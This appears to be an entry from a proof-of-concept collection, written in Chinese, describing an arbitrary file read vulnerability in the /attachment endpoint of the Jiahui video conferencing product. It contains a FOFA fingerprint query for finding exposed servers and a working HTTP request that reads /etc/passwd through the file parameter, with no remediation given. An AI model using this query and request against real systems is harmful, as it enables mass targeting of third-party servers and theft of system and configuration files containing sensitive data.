## 佳会视频会议attachment任意文件读取

佳会视频会议是由杭州叁体网络科技有限公司开发的一款线上视频会议软件，叁体·佳会3.0是业内首家兼容HTML5/WebRTC技术的网络会议产品,无需下载任何客户端与插件，即可开启视频会议，无需下载插件即可分享屏幕,甚至只需要用微信/QQ扫描二维码，就能加入视频会议。

佳会视频会议/attachment接口存在任意文件读取漏洞，攻击者可以利用漏洞读取服务器上的任意文件，包括配置文件等敏感信息。

## fofa
```
body="/user/get_app_scheme?site_id="
```

## poc
```
GET /attachment?file=/etc/passwd HTTP/1.1
Host: your-ip
Connection: keep-alive
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
```

![553eaec68e6630ad8d9d0ec8e762bdef](https://github.com/wy876/POC/assets/139549762/e7412e36-718a-47cc-bec3-3c0b8fc2145a)
